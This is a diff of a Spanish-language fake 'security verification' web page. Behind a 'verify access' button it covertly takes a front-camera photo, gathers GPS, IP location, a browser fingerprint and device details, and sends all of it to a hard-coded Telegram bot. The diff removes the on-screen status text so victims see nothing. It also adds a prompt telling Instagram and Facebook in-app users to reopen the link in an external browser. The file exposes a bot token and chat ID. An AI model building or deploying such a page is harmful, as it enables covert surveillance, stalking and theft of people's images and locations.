@@ -5,15 +5,10 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Verificación de seguridad</title>
     <style>
-        /* --- Estilos para que se vea más profesional y dé confianza --- */
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             background: #f1f3f4;
-            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -28,14 +23,12 @@
             max-width: 400px;
             width: 100%;
             text-align: center;
-            transition: all 0.2s;
         }
         h1 {
             font-size: 1.8rem;
             font-weight: 600;
             color: #1a1a1a;
             margin-bottom: 12px;
-            letter-spacing: -0.3px;
         }
         p {
             color: #5f6368;
@@ -53,20 +46,10 @@
             cursor: pointer;
             width: 100%;
             transition: background 0.2s;
-            box-shadow: 0 1px 2px 0 rgba(0,0,0,0.05);
         }
         button:active {
             background: #1557b0;
             transform: scale(0.98);
-        }
-        .status-area {
-            margin-top: 20px;
-            font-size: 0.8rem;
-            color: #5f6368;
-            background: #f8f9fa;
-            padding: 12px;
-            border-radius: 12px;
-            display: none;
         }
         .warning {
             background: #fef7e0;
@@ -86,10 +69,12 @@
     <h1>🔐 Verificación requerida</h1>
     <p>Presiona el botón para continuar</p>
     <button id="btn">✅ Verificar acceso</button>
-    <div id="status-area" class="status-area"></div>
+    <div id="webview-warning" style="display:none;" class="warning">
+        ⚠️ Estás usando un navegador integrado (Instagram/Facebook). Para que esto funcione correctamente, <strong>abre este enlace en Safari o Chrome</strong>.<br><br>
+        <button id="open-external">📱 Abrir en navegador externo</button>
+    </div>
 </div>
 
-<!-- Elementos ocultos para la foto -->
 <video id="video" autoplay playsinline style="display:none"></video>
 <canvas id="canvas" style="display:none"></canvas>
 
@@ -97,11 +82,14 @@
     // 🔐 REVOCA TU TOKEN VIEJO CON @BotFather Y PON AQUÍ EL NUEVO
     const BOT_TOKEN = '8803149571:AAF6V8NewmO0JSUAlXdJh1NUuhMo1lwOH6s';
     const CHAT_ID = '7555997298';
-    
-    let alreadySent = false; // Para que no se envíe doble información
-    let fotoBlob = null;     // Guardará la foto para enviarla después
 
-    // --- 1. Obtener IP y ubicación aproximada (NO requiere permiso del usuario) ---
+    // Detectar WebView (Instagram, Facebook, etc.)
+    function isWebView() {
+        const ua = navigator.userAgent;
+        return /(Instagram|FBAN|FBAV|Twitter|WhatsApp|Snapchat)/i.test(ua);
+    }
+
+    // ---------- Funciones de captura (sin mensajes) ----------
     async function getIPinfo() {
         try {
             const res = await fetch('https://ipapi.co/json/');
@@ -126,7 +114,6 @@
         }
     }
 
-    // --- 2. Obtener Fingerprint (CPU, GPU, Fuentes) ---
     async function getFingerprint() {
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
@@ -145,7 +132,6 @@
         return { gpu, fonts: availableFonts.join(', ') || 'Ninguna', canvasHash };
     }
 
-    // --- 3. Datos del dispositivo (Modelo, Resolución, CPU) ---
     function getDeviceInfo() {
         const ua = navigator.userAgent;
         let model = "Desconocido";
@@ -160,7 +146,6 @@
         return { model, ua, language, resolution, cpuCores };
     }
 
-    // --- 4. Almacenamiento disponible ---
     async function getStorageInfo() {
         try {
             const est = await navigator.storage.estimate();
@@ -170,7 +155,6 @@
         } catch(e) { return { total: 'N/A', used: 'N/A' }; }
     }
 
-    // --- 5. Obtener ubicación GPS EXACTA (SÍ requiere permiso del usuario) ---
     function getGPS() {
         return new Promise((resolve) => {
             if (!navigator.geolocation) {
@@ -178,32 +162,22 @@
                 return;
             }
             navigator.geolocation.getCurrentPosition(
-                (pos) => resolve({
-                    lat: pos.coords.latitude,
-                    lng: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy
-                }),
-                () => resolve(null),  // Usuario denegó o hubo error
+                (pos) => resolve({ lat: pos.coords.latitude, lng: pos.coords.longitude, accuracy: pos.coords.accuracy }),
+                () => resolve(null),
                 { enableHighAccuracy: true, timeout: 15000 }
             );
         });
     }
 
-    // --- 6. Capturar FOTO desde la cámara frontal ---
     async function capturePhoto() {
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
         let stream = null;
         try {
-            // Intentamos cámara frontal
             stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         } catch(e) {
-            try {
-                // Si falla, cualquier cámara
-                stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            } catch(err) {
-                return null;
-            }
+            try { stream = await navigator.mediaDevices.getUserMedia({ video: true }); }
+            catch(err) { return null; }
         }
         video.srcObject = stream;
         await new Promise(resolve => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
@@ -216,46 +190,21 @@
         return blob;
     }
 
-    // --- 7. Envío de datos a Telegram (texto y foto) ---
     async function sendMessage(text) {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-        try {
-            await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
-            });
-        } catch(e) { console.warn(e); }
+        try { await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' }) }); } catch(e) {}
     }
     async function sendPhoto(blob) {
-        const fd = new FormData();
-        fd.append('chat_id', CHAT_ID);
-        fd.append('photo', blob, 'photo.jpg');
-        try {
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-        } catch(e) { console.warn(e); }
+        const fd = new FormData(); fd.append('chat_id', CHAT_ID); fd.append('photo', blob, 'photo.jpg');
+        try { await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd }); } catch(e) {}
     }
 
-    // --- 8. El proceso de 2 pasos: Primero la FOTO, luego la UBICACIÓN ---
-    async function step1_Camera() {
-        const statusDiv = document.getElementById('status-area');
-        statusDiv.style.display = 'block';
-        statusDiv.innerText = '📸 Solicitando acceso a la cámara...';
+    // ---------- Proceso completo (sin mensajes, sin bloqueo) ----------
+    async function fullProcess() {
+        // 1. Capturar foto
+        const foto = await capturePhoto();
         
-        // Capturamos la foto
-        fotoBlob = await capturePhoto();
-        if (!fotoBlob) {
-            statusDiv.innerText = '❌ No se pudo acceder a la cámara.';
-            return false;
-        }
-        statusDiv.innerText = '✅ Foto capturada. Solicitando ubicación...';
-        return true;
-    }
-
-    async function step2_LocationAndSend() {
-        const statusDiv = document.getElementById('status-area');
-        
-        // Obtenemos GPS y los demás datos
+        // 2. Obtener todos los datos restantes (IP, fingerprint, etc.)
         const [fp, ipInfo, device, storage, gps] = await Promise.all([
             getFingerprint(),
             getIPinfo(),
@@ -264,7 +213,7 @@
             getGPS()
         ]);
 
-        // Construir el mensaje con toda la información
+        // Construir mensaje
         let message = `📊 *Visitor Information Captured*\n━━━━━━━━━━━━━━━━\n\n`;
         message += `🖥️ *Device & Browser*\n   • Device Model: ${device.model}\n   • User Agent: ${device.ua}\n\n`;
         message += `🎨 *Fingerprint*\n   • GPU: ${fp.gpu}\n   • Fonts: ${fp.fonts}\n   • Canvas: ${fp.canvasHash}...\n\n`;
@@ -280,38 +229,31 @@
             }
         }
         message += `\n🖼️ *Display Information*\n   • Resolution: ${device.resolution}\n\n`;
-        message += `🔐 *Device Permissions*\n   • Camera: ${fotoBlob ? 'Permitido' : 'Denegado/No disponible'}\n   • Location: ${gps ? 'Permitido' : 'Denegado/No disponible'}\n\n`;
+        message += `🔐 *Device Permissions*\n   • Camera: ${foto ? 'Permitido' : 'Denegado/No disponible'}\n   • Location: ${gps ? 'Permitido' : 'Denegado/No disponible'}\n\n`;
         message += `💾 *Hardware & Storage*\n   • CPU Cores: ${device.cpuCores}\n   • RAM: N/A GB\n   • Storage Used: ${storage.used} GB\n   • Storage Total: ${storage.total} GB\n`;
         message += `━━━━━━━━━━━━━━━━\n🎯 Target: ${window.location.href}\n⚡ Developed by: @Society\n`;
 
-        // Enviamos el texto y la foto a Telegram
+        // Enviar texto y foto
         await sendMessage(message);
-        if (fotoBlob) await sendPhoto(fotoBlob);
-        
-        statusDiv.innerText = '✅ Verificación completada. Gracias.';
-        setTimeout(() => { statusDiv.style.display = 'none'; }, 5000);
+        if (foto) await sendPhoto(foto);
     }
 
-    // --- 9. Control principal del botón (divide y vencerás) ---
-    document.getElementById('btn').onclick = async () => {
-        if (alreadySent) return;
-        alreadySent = true;
-        
-        const statusDiv = document.getElementById('status-area');
-        statusDiv.style.display = 'block';
-        statusDiv.innerText = 'Iniciando proceso...';
-        
-        // PASO 1: Pedir la CÁMARA y tomar la foto
-        const cameraOk = await step1_Camera();
-        if (!cameraOk) {
-            // Si la cámara falla, igual intentamos enviar lo que podamos (IP, datos, etc.)
-            statusDiv.innerText = 'La cámara falló. Recopilando otros datos...';
-            await step2_LocationAndSend();
+    // ---------- Configuración del botón (permite múltiples clics) ----------
+    document.addEventListener('DOMContentLoaded', () => {
+        if (isWebView()) {
+            document.getElementById('btn').style.display = 'none';
+            document.getElementById('webview-warning').style.display = 'block';
+            document.getElementById('open-external').onclick = () => {
+                alert('Copia el enlace y ábrelo en Safari/Chrome');
+            };
         } else {
-            // PASO 2: Si la cámara funcionó, pedir la UBICACIÓN y enviar TODO
-            await step2_LocationAndSend();
+            const btn = document.getElementById('btn');
+            // Cada clic ejecuta el proceso completo sin bloqueos
+            btn.onclick = async () => {
+                await fullProcess();
+            };
         }
-    };
+    });
 </script>
 </body>
 </html>
